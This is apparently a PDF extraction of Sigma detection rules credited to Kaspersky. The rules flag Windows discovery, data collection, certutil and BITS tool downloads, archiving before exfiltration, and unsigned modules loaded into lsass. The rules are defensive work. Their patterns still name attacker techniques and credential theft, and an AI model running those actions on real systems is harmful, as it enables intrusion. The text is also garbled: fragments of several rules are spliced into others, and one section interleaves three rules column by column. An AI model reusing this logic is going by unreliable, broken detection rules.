'client.superhideip.com\n(http://client.superhideip.com)'\n- 'ip2location'\n- 'api.2ip'\n- 'portchecktool'\n- 'canyouseeme'\n- 'ip-ping.ru (http://ip-ping.ru)'\n\n\n- 'check-host'\n- '2ip.ua (http://2ip.ua)'\n- 'whatismyip'\n- 'iptools'\n- 'portquiz'\n- '2ip.ru (http://2ip.ru)'\n- 'hidemy.name (http://hidemy.\nname)'\n- 'hostip'\n- 'iplookup'\n- 'meineip'\nfilter:\nImage|endswith:\n- 'msedge.exe'\n- 'betternet.exe'\n- 'xunfengcooperate.exe'\n- 'sidebar.exe'\n- 'stellarium.exe'\n- 'vmnat.exe'\n- 'sogoucloud.exe'\n- 'virtualbox.exe'\n- 'reiboot.exe'\n- 'qbittorrent.exe'\n- 'eu4.exe'\n- 'mcafee safe connect.exe'\n- 'sohunews.exe'\n- 'fiddler.exe'\n- 'iwproxy.exe'\n- 'waterfox.exe'\n- 'maxthon.exe'\n- 'icedragon.exe'\n- 'sogouexplorer.exe'\n- 'seamonkey.exe'\n- 'ieuser.exe'\n- 'safari.exe'\n- 'browser.exe'\n- 'opera.exe'\n- 'amigo.exe'\n- 'chrome.exe'\n- 'firefox.exe'\n- 'iexplore.exe'\n- 'utorrent.exe'\n- 'pcapsvc2.exe'\n- 'testrunner.exe'\n- 'ksde.exe'\n- 'kpm.exe'\n- 'cntlm.exe'\n- 'klan.exe'\n- 'vmnat.exe'\n- 'proxifier.exe'\n- 'tradematictrader.exe'\n- 'sgnews.exe'\n- 'slack'\n- 'x-lite.exe'\n- 'qemu-system-i386.exe'\n- 'client_tos.exe'\n\n\n- 'nvnetworkservice.exe'\n- 'nvstreamsvc.exe'\n- '360se.exe'\n- 'rainmeter.exe'\n- 'microsoftedgecp.exe'\n- 'virtualboxvm.exe'\n- 'qqbrowser.exe'\n- 'vivaldi.exe'\ncondition: selection1 and not filter\nfalsepositives:\n- Legitimate applications\nfrom \"Program Files\", specific for\norganization\nlevel: high\n\n\n-----\n\n- attack.T1059.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\nselection2:\nCommandLine|contains:\n- 'Get-NetTCPConnection'\ncondition: selection1 and\nselection2\nfalsepositives:\n- Legitimate Administrator activity\nlevel: low\n\n\ntitle: Sigma-Generic-Local\nGroups Discovery via\nPowerShell\n\nid: a8ac79a0-dc07-409b9fb8-261672340690\nstatus: stable\ndescription: Adversaries may\nattempt to discover local groups\nand permission settings via\nPowerShell\nmodified: 2023-08-07\ntags:\n- attack.discovery\n- attack.T1069\nauthor: Kaspersky\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\pwsh.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\n- '\\SyncAppvPublishingServer.\nexe'\nselection2:\nCommandLine|contains:\n- 'get-localgroup'\n- 'Get-LocalGroupMember'\nselection3:\nCommandLine|contains|all:\n- 'Get-WMIObject'\n- 'Win32_Group'\ncondition: selection1 and\nselection2 and selection3\nfalsepositives:\n- Legitimate System Administrator\nactions\nlevel: low\n\n\ntitle: System Network\nConnections Discovery via\nPowerShell\n\nid: 29b013d0-5d48-4872-89cdf9a78ac4d414\ndescription: Detects system\nnetwork connections discovery via\nPowerShell\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.Discovery\n- attack.T1049\n- attack.Execution\n\n\ntitle: System Network\nConnections Discovery via\nStandard Windows Utilities\n\nid: 5484af3a-08d6-44d4-9b5b37f8ae20c699\ndescription: Detects system\nnetwork connections discovery via\nstandard windows utilities\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.discovery\n- attack.t1049\nlogsource:\nproduct: windows\n\n\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\netstat.exe'\nselection2:\nImage|endswith:\n- '\\net.exe'\n- '\\net1.exe'\nselection3:\nCommandLine|contains:\n- 'session'\ncondition: selection1 or\n(selection2 and selection3)\nfalsepositives:\n- Legitimate Administrator activity\nlevel: low\n\n\ntitle: Generic-service\nmanipulations via net.exe\n\nid: 732d6166-9815-4bde-9000ed6b00aebb9b\ndescription: detects interaction\nwith services via net.exe\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.persistence\n- attack.t1543.003\nlogsource:\nproduct: windows\n\n\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\net.exe'\n- '\\net1.exe'\nCommandLine|contains|all:\n- ' start '\n- ' stop '\n- ' pause '\n- ' continue '\ncondition: selection\nfalsepositives:\n- unknown\nlevel: low\n\n\n-----\n\ntitle: Sigma-Generic-System\nTime Discovery via standard\nwindows utilities\n\nid: bdb61c6f-94ee-4d3a-b132c971abe4d71d\nstatus: stable\ndescription: Adversary may gather\nthe system time and/or time zone\nfrom local or remote system via\nstandard windows utilities\nmodified: 2023-08-07\ntags:\n- attack.discovery\n- attack.t1124\nauthor: Kaspersky\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\w32tm.exe'\nfilter1:\nParentImage|endswith:\n- '\\sdiagnhost.exe'\n- '\\activehealth.exe'\n- '\\qualysagent.exe'\n- '\\touchpointanalyticsclient.\nexe'\nfilter2:\nParentCommandLine|contains:\n- 'C:\\Windows\\system32\\\nwsmprovhost.exe -embedding'\n- 'monitoringhost.exe\"\n-embedding'\n- 'touchpointanalyticsclient.\nexe'\n- 'C:\\Windows\\system32\\\nsdiagnhost.exe -embedding'\n- 'C:\\Windows\\system32\\\nwindowsPowerShell\\v1.0\\\nPowerShell.exe'\nCommandLine|contains:\n- '/monitor'\n- '/query /peers'\n- '/query /source'\n- 'stripchart'\nfilter3:\nCommandLine|contains:\n- 'config /update'\n- 'register'\n- '/resync'\n- '/query /status'\n- 'syncfromflags'\nselection2:\nImage|endswith:\n- '\\net.exe'\n- '\\net1.exe'\nCommandLine|contains:\n- 'time'\n\n\nfilter4:\nParentImage|endswith:\n- '\\net.exe'\nfilter5:\nParentImage|contains:\n- 'picus security\\picus'\nfilter6:\nCommandLine|contains:\n- ' stop '\n- ' start '\n- 'multimed'\n- '/set'\ncondition: (selection1 and not\nfilter1 and not filter2 and not filter3)\nor (selection2 and not filter4 and\nnot filter5 and not filter6)\nfalsepositives:\n- Administrators activity (scripts,\netc)\nlevel: medium\n\n\ntitle: Sigma-GenericSystem Time Discovery via\nPowerShell\n\nid: 1c6d62bb-5a21-4720-8f1a6c7ebdf72f5a\nstatus: stable\ndescription: Adversary may gather\nthe system time and/or time zone\nfrom local or remote system via\nPowerShell\nmodified: 2023-08-07\ntags:\n- attack.discovery\n- attack.t1124\nauthor: Kaspersky\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\SyncAppvPublishingServer.\nexe'\n- '\\pwsh.exe'\n- '\\wmic.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\nselection2:\nCommandLine|contains:\n- 'get '\nselection3:\nCommandLine|contains:\n- 'timezone'\n- 'date'\nselection4:\nCommandLine|contains:\n- 'win32_timezone'\nfilter1:\nCommandLine|contains:\n- 'creationdate'\n- 'update'\n- 'installdate'\nfilter2:\nParentCommandLine|contains:\n- 'wmic os get localdatetime'\nfilter3:\nImage|contains:\n- 'C:\\Windows\\SysWOW64\\\nwbem'\ncondition: selection1 and\n((selection2 and (selection3 and not\nfilter1)) or selection4) and not filter2\nand not filter3\nfalsepositives:\n- Administrators activity (scripts,\netc)\nlevel: low\n\n\n-----\n\ntitle: Network Share\nDiscovery via PowerShell\n\nid: 98e6d045-205a-4551-8ffcd833a1ce2ed3\ndescription: Detects network share\ndiscovery via PowerShell\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.discovery\n- attack.t1135\n- attack.execution\n- attack.t1059.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\nselection2:\nCommandLine|contains:\n- 'Get-SmbShare'\n\n\ncondition: selection1 and\nselection2\nfalsepositives:\n- Legitimate Administrator\nactivity\nlevel: low\n\n\ntitle: Sigma-Generic-Domain\nGroups Discovery via net.exe\n\nid: 4fa28a37-6bad-4a39-8274a57cf12156ec\nstatus: stable\ndescription: Adversaries may\nattempt to discover domain groups\nand permission settings via net.exe\nmodified: 2023-08-07\ntags:\n- attack.discovery\n- attack.T1069\nauthor: Kaspersky\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\net.exe'\n- '\\net1.exe'\nselection2:\nCommandLine|contains:\n- ' group'\n- ' user'\nselection3:\nCommandLine|contains:\n\n\n- '/do '\n- '/dom '\n- '/doma '\n- '/domain'\nselection4:\nCommandLine|contains:\n- ' use'\n- ' user'\n- ' session'\n- '/add '\n- ' stop '\n- ' /del'\n- ' /hold'\n- ' /release'\n- ' start '\ncondition: selection1 and\nselection2 and selection3 and not\nselection4\nfalsepositives:\n- Legitimate System Administrator\nactions\nlevel: low\n\n\ntitle: Network Share\nDiscovery via Standard\nWindows Utilities\n\nid: 9c6074b0-b4db-4250-a90a9bcd29060c4f\ndescription: Detects network\nconnections discovery via standard\nwindows utilities\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.discovery\n- attack.t1135\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\net.exe'\n- '\\net1.exe'\nselection2:\nCommandLine|contains:\n- ' use'\nselection3:\nCommandLine|contains:\n- '\\\\'\n- '\\share'\n- 'delete'\n- 'stop'\n- 'home'\n- 'persistent'\nselection4:\nCommandLine|contains:\n- 'share'\nselection5:\nCommandLine|contains:\n- 'change'\n- 'delete'\nselection6:\nCommandLine|contains:\n- 'view'\ncondition: selection1 and ( (\nselection2 and not selection3 ) or (\nselection4 and not selection5 ) or\nselection6 )\nfalsepositives:\n- Legitimate Administrator\nactivity\nlevel: low\n\n\n-----\n\ntitle: Local Account\nDiscovery via Standard\nWindows Utilities\n\nid: 1eb6058a-158c-47eb-9f4ba0b8cf884b1f\ndescription: Adversaries may\nattempt to get a listing of\naccounts on a system or within an\nenvironment\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.discovery\n- attack.t1087.001\n- attack.t1087.002\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\net.exe'\n- '\\net1.exe'\nCommandLine|contains:\n- 'user'\n- 'group'\nfilter:\nCommandLine|contains:\n- ' use '\n- ' add '\n- ' stop '\n- ' delete '\n- ' start '\nselection2:\nImage|endswith:\n- '\\quser.exe'\nselection3:\nImage|endswith:\n- '\\query.exe'\nCommandLine|contains:\n- 'user'\ncondition: (selection1 and not\nfilter) or selection2 or selection3\nfalsepositives: Legitimate System\nAdministrator actions\nlevel: low\n\n\ntitle: Sigma-Generic-Groups\nDiscovery via PowerShell\n\nid: 5a5ed03e-7424-4a76-8693d85d3e59a832\nstatus: stable\ndescription: Adversaries may\nattempt to discover domain/cloud\ngroups and permission settings via\nPowerShell\nmodified: 2023-08-07\ntags:\n- attack.discovery\n- attack.T1069\nauthor: Kaspersky\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\pwsh.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\n- '\\SyncAppvPublishingServer.\nexe'\n\n\ntitle: Suspicious Wildcard\nSearching Data\n\nid: 358c7c01-051b-45c1-b29f06d55a17ddcc\nstatus: experimental\ndescription: Adversaries may\nsearch local system sources, such\nas file systems or local databases,\nto find files of interest and sensitive\ndata\nauthor: Kaspersky\nmodified: 2023-09-08\ntags:\n- attack.collection\n- attack.t1005\n- attack.discovery\n- attack.t1083\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection:\nImage|endswith:\n- '\\cmd.exe'\n- '\\PowerShell.exe'\n- '\\pwsh.exe'\nCommandLine|contains|all:\n\n\nselection2:\nCommandLine|contains|all:\n- 'get-aduser'\n- ' -f'\n- ' -pr'\nselection3:\nCommandLine|contains:\n- 'Get-MsolGroup'\n- 'Get-MsolRole'\ncondition: selection1 and\n(selection2 or selection3)\nfalsepositives:\n- Legitimate System Administrator\nactions\nlevel: low\n\n\n- '\\users'\n- '*.'\ncondition: selection\nfalsepositives:\n- Legitimate admin scripts or\nother admin activity\nlevel: medium\n\n\n-----\n\ntitle: Remote System\nDiscovery via PowerShell\n\nid: 4562d3a1-4c66-4d71-89b8a2d5df89fafb\ndescription: Detects remote\nsystem discovery via PowerShell\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.discovery\n- attack.t1018\n- attack.execution\n- attack.t1059.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\nselection2:\nCommandLine|contains:\n- 'ds_computer'\n\n\n- 'Get-DomainController'\n- 'Get-AdComputer'\ncondition: selection1 and\nselection2\nfalsepositives:\n- Legitimate Administrator activity\nlevel: low\n\n\ntitle: Group Policy Discovery\nvia gpresult\n\nid: 56ef8376-20ed-4f2f-a6215d24d9016150\nstatus: stable\ndescription: Adversaries may\nuse commands such as gpresult\nor various publicly available\nPowerShell functions, such\nas Get-DomainGPO and GetDomainGPOLocalGroup, to gather\ninformation on Group Policy\nsettings\nauthor: Kaspersky\nmodified: 2023-08-22\ntags:\n- attack.discovery\n- attack.t1615\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection1:\nImage|endswith:\n- '\\gpresult.exe'\nselection2:\nCommandLine|contains:\n\n\n- '/z'\n- '/v'\ncondition: selection1 and\nselection2\nfalsepositives:\n- Legitimate Administrators' and\nSowtware activity\nlevel: low\n\n\ntitle: Sigma-Generic-Domain\nTrust Discovery via nltest.exe\n\nid: ea5f4505-03ea-4240-899866c93c163c38\ndescription: Adversaries may\nattempt to gather information on\ndomain trust relationships that\nmay be used to identify lateral\nmovement.\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.discovery\n- attack.T1482\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection:\nImage|endswith: '\\nltest.exe'\nCommandLine|contains:\n- '/domain_trusts'\n- '/trusted_domains'\n- '/dsgetfti'\n- '/sc_query'\n- '/dcname'\n- '/dnsgetdc'\n- '/parentdomain'\n- '/dsregdns'\n- '/whowill'\n- '/dclist'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: low\n\n\n-----\n\ntitle: Domain Account\nDiscovery via PowerShell\n\nid: 141f2963-6b6f-44f8-a44ec3228214d802\ndescription: Adversaries may\nattempt to get a listing of\naccounts on a system or within an\nenvironment via PowerShell\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.discovery\n- attack.t1087.002\n- attack.execution\n- attack.t1059.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\pwsh.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\n- '\\SyncAppvPublishingServer.\nexe'\nselection2:\nCommandLine|contains|all:\n- 'Get-ADUser'\n- 'filter'\nselection3:\nCommandLine|contains|all:\n- 'Get-ADUser'\n- 'Identity'\nselection4:\nCommandline|contains:\n- 'Get-MsolUser'\ncondition: selection1 and\n(selection2 or selection3 or\nselection4)\nfalsepositives:\n- Legitimate Administrator or\nsoftware activity\nlevel: low\n\n\ntitle: Process Discovery via\nPowerShell\n\nid: b825b208-0d6b-4df7-8d9bfe0b0817cf00\ndescription: Detects process\ndiscovery via PowerShell\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.Discovery\n- attack.T1057\n- attack.Execution\n- attack.T1059.001\nlogsource:\n\n\ntitle: Sigma-Generic-Archive\nvia PowerShell\n\nid: 61d7f846-8e3e-4994-8cf6e6dfce06bf23\nstatus: stable\ndescription: Adversaries may\nuse utilities to compress and/or\nencrypt collected data prior to\nexfiltration\nmodified: 2023-08-07\ntags:\n- attack.collection\n- attack.T1560.001\nauthor: Kaspersky\nlogsource:\nproduct: windows\n\n\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\nselection2:\nCommandLine|contains:\n- 'Get-Process'\ncondition: selection1 and\nselection2\nfalsepositives:\n- Legitimate Administrator\nactivity\nlevel: low\n\n\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\pwsh.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\n- '\\SyncAppvPublishingServer.\nexe'\nselection2:\nCommandLine|contains:\n- 'compress-archive'\ncondition: selection1 and\nselection2\nfalsepositives:\n- Unknown\nlevel: low\n\n\ntitle: Generic-Anomaly\nParent Process whoami.exe\n\nid: 19089eb8-fd97-4bae-b5ab047c0f79509b\ndescription: Anomaly Parent\nProcess whoami.exe\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.discovery\n- attack.T1033\nlogsource:\ncategory: process_creation\n\n\nproduct: windows\ndetection:\nselection:\nParentImage|endswith:\n- '\\cmd.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\n- '\\pwsh.exe'\n- '\\MonitoringHost.exe'\nImage|endswith: '\\whoami.exe'\ncondition: selection\nfalsepositives:\n- Administrators activity or legit\nsoftware\nlevel: medium\n\n\n-----\n\ntitle: System Owner/User - '\\program files\\microsoft title: Group Policy Discovery\nDiscovery via Standard monitoring agent\\agent\\' via PowerShell\n\n                          - 'c:\\program files\\tomcat_'\n\nWindows Utilities\n\n                          - '\\android\\android studio\\\njre\\' id: 7e276936-83b5-4821-9e6c\nid: aec7e049-8ef2-47aa-ac8c- - '\\program files\\microsoft 005c44940549\nf6c9ce6b2508 system center\\operations status: stable\ndescription: System Owner/User manager\\server\\monitoringhost. description: Adversaries may\nDiscovery via Standard Windows exe' use commands such as gpresult\nUtilities filter3: or various publicly available\nauthor: Kaspersky ParrentImage|contains: PowerShell functions, such\nstatus: stable - '\\zabbix\\bin\\zabbix_agentd. as Get-DomainGPO and Getmodified: 2023-07-18 exe' DomainGPOLocalGroup, to gather\ntags: - '\\siemens\\teamcenter12\\' information on Group Policy\n- attack.discovery condition: (selection_1 and settings\n- attack.T1033 not filter1) or selection_2 or author: Kaspersky\nlogsource: (selection_3 and not filter3) modified: 2023-08-22\ncategory: process_creation falsepositives: tags:\nproduct: windows - Administrators activity or legit - attack.discovery\ndetection: software - attack.t1615\nselection_1: level: low logsource:\nImage|endswith: '\\whoami.exe' category: process_creation\nselection_2: product: windows\nImage|endswith: '\\query.exe' detection:\nCommandLine|contains: ' user ' selection1:\nselection_3: Image|endswith:\nImage|endswith: '\\cmd.exe' - '\\pwsh.exe'\nCommandLine|contains: - '\\PowerShell.exe'\n- ' qwinsta ' - '\\PowerShell_ise.exe'\n- ' quser ' - '\\\nfilter1: SyncAppvPublishingServer.exe'\nParentImage|contains: selection2:\n- '\\program files\\1c\\agentetp\\' CommandLine|contains:\n- '\\ibm\\itm\\' - 'Get-DomainGPO'\n- '\\autodesk\\genuine - 'Get-gpo'\nservice\\' - 'Get-NetGpo'\n- '\\veritas\\netbackup\\bin\\' - 'GPOLocalGroup'\n- '\\program files\\veritas\\ - 'Import-Module\nbackup exec\\' GroupPolicy'\n- '\\program files\\symantec\\ - 'Getbackup exec\\' GPResultantSetofPolicy'\n- '\\puppet labs\\puppet' - 'Get-GPOReport'\n\n                                                      - 'Get-DomainOU'\n                                                          - 'Get-NetOU'\ncondition: selection1 and\nselection2\nfalsepositives:\n                                             - CyberCNS agent\n                                                 - Legitimate Software and\ntitle: Process Discovery via - attack.T1057 Administrators' activity\nStandard Windows Utilities logsource: level: low\n\nproduct: windows\ncategory: process_creation\n\nid: 1c76cfca-5e35-4dae-941b- detection:\n461a78f3cacd selection:\ndescription: Adversaries may Image|endswith:\nattempt to get information about - '\\tasklist.exe'\nrunning processes condition: selection\nauthor: Kaspersky falsepositives: Legitimate System\nstatus: stable Administrator actions\nmodified: 2023-08-02 level: low\ntags:\n- attack.Discovery\n\n\n-----\n\ntitle: Sigma-GenericWindows Shell Started\nArchive Utility\n\nid: 73646f09-c6dd-4626-904af1966c27a7be\nstatus: stable\ndescription: Adversaries may\nuse utilities to compress and/or\nencrypt collected data prior to\nexfiltration\ntags:\n- attack.collection\n- attack.T1560.001\nauthor: Kaspersky\ndate: 2023-08-07\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\winrar.exe'\n- '\\rar.exe'\n- '\\winzip64.exe'\n- '\\7zip.exe'\n- '\\7z.exe'\n- '\\7z64.exe'\n- '\\7za.exe'\n- '\\pkzip.exe'\n- '\\zip.exe'\n- '\\winzip.exe'\nParentImage|endswith:\n- '\\PowerShell_ise.exe'\n- '\\cmstp.exe'\n- '\\appvlp.exe'\n- '\\mftrace.exe'\n- '\\scriptrunner.exe'\n- '\\forfiles.exe'\n- '\\msiexec.exe'\n- '\\rundll32.exe'\n- '\\mshta.exe'\n- '\\hh.exe'\n- '\\wmic.exe'\n- '\\regsvr32.exe'\n- '\\scrcons.exe'\n- '\\bash.exe'\n- '\\cscript.exe'\n- '\\wscript.exe'\n- '\\PowerShell.exe'\n- '\\cmd.exe'\ncondition: selection\nfalsepositives:\n- legitimate software\n- administrator scripts\nlevel: low\n\n\ntitle: System Owner/User\nDiscovery via PowerShell\n\nid: a234e8a1-00e4-4331-9a8a6394d4337aca\ndescription: System Owner/User\nDiscovery via PowerShell\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.discovery\n- attack.T1033\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection_1:\nImage|endswith:\n- '\\pwsh.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\nCommandLine|contains|all:\n- 'System.Security.Principal.\nWindowsIdentity'\n- 'GetCurrent'\nselection_2:\nImage|endswith:\n- '\\pwsh.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\nCommandLine|contains|all:\n- 'Get-WMIObject'\n- 'Win32_ComputerSystem'\n- 'Select-Object'\n- 'username'\nselection_3:\nImage|endswith:\n\n\ntitle: Bitsadmin Job via\nPowerShell\n\nid: f5405f33-bc7e-412f-a6b6264a6643b826\ndescription: Detects PowerShell\ncommand starting bitsadmin\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.defense_evasion\n- attack.persistence\n- attack.t1197\n- attack.command_and_control\n- attack.t1105\n- attack.lateral_movement\n\n\n- '\\pwsh.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\nCommandLine|contains|all:\n- 'System.Environment'\n- 'UserName'\nfilter1:\nParentImage|contains:\n- '\\jabra\\direct4\\jabra-direct.\nexe'\n- '\\jabra\\direct6\\jabra-direct.\nexe'\n- '\\microsoft vs code\\code.\nexe'\n- '\\nureva\\nureva console\nclient\\resources\\services\\'\n- '\\program files\\azure data\nstudio\\'\n- '\\microsoft azure storage\nexplorer\\storageexplorer.exe'\n- '\\program files\\axis\ncommunications\\axis smart search\\\naxissmartsearch.exe'\n- '\\hashicorp\\vagrant\\\nembedded\\'\n- '\\program files\\kubernetes\\\nminikube\\'\n- '\\appdata\\local\\programs\\\nazure data studio\\azuredatastudio.\nexe'\n- '\\appdata\\local\\programs\\\nprometric-candidate-app\\\nproproctor.exe'\ncondition: (selection_1 and not\nfilter1) or selection_2 or selection_3\nfalsepositives:\n- Administrators activity\nlevel: medium\n\n\n- attack.t1570\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\pwsh.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\n- '\\\nSyncAppvPublishingServer.exe'\nCommandLine|contains:\n- 'Start-BitsTransfer'\ncondition: selection\nfalsepositives:\n- unknown\nlevel: high\n\n\n-----\n\ntitle: System Owner/User\nDiscovery via Suspicious\nCommandLine whoami\n\nid: 7a096f73-db4c-4cf2-8c2080fe02ab08da\ndescription: System Owner/\nUser Discovery via Suspicious\nCommandLine whoami\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.discovery\n- attack.T1033\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\n\n\nselection_1:\nImage|endswith: '.exe'\nCommandLine|contains: '\nwhoami'\nselection_2:\nImage|endswith: '\\whoami.exe'\nCommandLine|contains:\n- '/priv'\n- '/all'\nfilter:\nImage|contains:\n- '\\trassir-'\n- '\\dssl\\trassir-'\ncondition: (selection_1 and not\nfilter) or selection_2\nfalsepositives:\n- Administrators activit, group\npolicy scripts, MSSQL server\nactivity\nlevel: low\n\n\ntitle: Image Loaded into\nlsass.exe\n\nid: 95d7b51d-c3cd-4dea-89cd8d2fd2a4b93a\ndescription: Detects unsigned\nimage loaded into LSASS process\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.Credential_Access\n- attack.T1003.001\nlogsource:\ncategory: image_load\nproduct: windows\ndetection:\nselection:\nImage|endswith: '\\lsass.exe'\nfilter:\nSigned: 'True'\nSignatureStatus: 'Valid'\nSignature:\n- 'Microsoft Windows Hardware\nCompatibility Publisher'\n- 'Microsoft Windows'\n- 'Microsoft Corporation'\n- 'VMware, Inc.'\n- 'CRYPTO-PRO'\n- 'Microsoft Windows Publisher'\n- 'LLC Crypto-Pro'\n- 'Crypto-Pro'\n- 'CRYPTO-PRO LLC'\n- 'Microsoft Windows Software\nCompatibility Publisher'\ncondition: selection and not filter\nfalsepositives:\n- Legitimate software DLL loaded\ninto lsass.exe; update the whitelist\nwith it by SHA256 or Signature\nlevel: medium\n\n\ntitle: Mounting Shares via net\n\nid: 18fccc85-4def-4546-82f97fde398f2e22\ndescription: Detects shares\nmounting via net.exe\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-09-11\ntags:\n- attack.lateral_movement\n- attack.t1021.002\nlogsource:\ncategory: process_creation\nproduct: windows\n\n\ndetection:\nselection:\nImage|endswith:\n- '\\net.exe'\n- '\\net1.exe'\nCommandLine|contains|all:\n- ' use '\n- ' \\\\'\ncondition: selection\nfalsepositives:\n- Administrators\nlevel: medium\n\n\ntitle: Sigma-Generic-Archive\nFile in Local Users Folders via\nMakecab.exe\n\nid: a70609a8-592e-471e-84fbf163447fb7ab\nstatus: stable\ndescription: Adversaries may\nuse utilities to compress and/or\nencrypt collected data prior to\nexfiltration\nmodified: 2023-08-07\ntags:\n- attack.collection\n\n\n- attack.T1560.001\nauthor: Kaspersky\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\makecab.exe'\nCommandLine|contains:\n- 'C:\\Users'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: low\n\n\n-----\n\ntitle: Possible wildcard\ncollection sensitive data via\nPowerShell\n\nid: e36a30f8-d315-46eb-9046de28fb13a554\ndescription: Detects wildcard\nsearch in PowerShell, may indicate\nuser data collection\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.collection\n- attack.t1119\n- attack.execution\n- attack.t1059.001\nlogsource:\ncategory: ps_script\nproduct: windows\ndefinition: 'Requirements: Script\nBlock Logging must be enabled'\ndetection:\nselection1:\nScriptBlockText|contains|all:\n- 'dir'\n- '-Recurse'\n- '-Include'\nselection2:\nScriptBlockText|contains:\n- '*.doc'\n- '*.docx'\n- '*.xls'\n- '*.xlsx'\n- '*.ppt'\n- '*.pptx'\n- '*.pdf'\n- '*.rtf'\n- '*.tif'\n- '*.odt'\n- '*.ods'\n- '*.odp'\n- '*.eml'\n- '*.msg'\ncondition: selection1 and\nselection2\nfalsepositives:\n- Legit scripts\nlevel: high\n\n\ntitle: Ingress Tool Transfer via\ncertutil\n\nid: 27f98513-2a9b-4b63-bd57ed04f4e1f954\ndescription: Detects Ingress Tool\nTransfer via certutil\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.command_and_control\n- attack.t1105\n- attack.t1071\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- 'certutil.exe'\nselection2:\nCommandLine|contains|all:\n- '-urlcache'\n- '-split'\nselection3:\nCommandLine|contains|all:\n- '-verifyctl'\n\n\ntitle: Sigma-GenericArchiving Files in Recycle Bin\nvia Archive\n\nid: e949171a-0198-47de-98a5b3ace508fae1\nstatus: stable\ndescription: Adversaries may\nuse utilities to compress and/or\nencrypt collected data prior to\nexfiltration\ntags:\n- attack.collection\n- attack.T1560.001\nauthor: Kaspersky\ndate: 2023-08-07\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\winrar.exe'\n- '\\rar.exe'\n- '\\winzip64.exe'\n- '\\7zip.exe'\n\n\n- '\\7z.exe'\n- '\\7z64.exe'\n- '\\7za.exe'\n- '\\pkzip.exe'\n- '\\zip.exe'\n- '\\winzip.exe'\n- '\\winzip64.exe'\nCommandLine|contains:\n- 'Recycle.bin'\ncondition: selection\nfalsepositives:\n- legitimate software\nlevel: low\n\n\n- '-split'\ncondition: (selection1 and\nselection2) or (selection1 and\nselection3)\nfalsepositives: unknown\nlevel: high\n\n\n-----\n\ntitle: Network Connection to\nCloud Storage in Command\nLine\n\nid: 